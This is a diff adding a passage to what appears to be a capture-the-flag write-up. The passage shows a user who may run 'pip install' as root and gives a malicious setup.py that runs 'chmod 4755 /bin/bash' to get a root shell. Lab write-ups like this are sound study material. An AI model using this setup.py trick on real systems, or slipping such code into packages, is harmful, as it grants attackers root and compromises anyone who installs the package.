@@ -668,3 +668,21 @@ User homer may run the following commands on canape:
 <br />
 
 As we can see, this `user` can run `pip install` as `root`.
+
+This is really `dangerous`, because when we `run` a pip install, `pip` start `searching` the `"setup.py"` file to `run it`, so if we `create` this file with `malicious code` we can `run` any `command` as `root`.
+
+<br />
+
+`Malicious setup.py Content:`
+
+<br />
+
+```python 
+#!/usr/bin/env python 
+
+import os 
+
+os.system('chmod 4755 /bin/bash')
+```
+
+<br />
